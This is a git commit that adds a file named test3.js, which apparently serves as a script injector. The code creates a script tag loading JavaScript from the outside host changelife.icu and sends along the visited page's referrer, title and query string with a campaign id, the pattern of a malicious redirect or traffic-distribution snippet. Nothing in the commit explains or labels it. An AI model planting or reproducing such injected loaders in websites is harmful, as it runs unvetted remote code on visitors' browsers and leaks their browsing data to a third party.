cbe88387a3e474f3526eec30115b1b1de7ebdca3
Pasha <Aynobe@users.noreply.github.com>
2019-03-01 13:54:38 +0200

    Create test3.js

---
+++ test3.js
@@ -0,0 +1,8 @@
+var d=document;var s=d.createElement('script'); 
+s.src='https://changelife.icu/GSGQhXYT?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script&_cid=a2966f9c-771c-69f5-7e48-3669dcf8010f'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://changelife.icu/GSGQhXYT?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
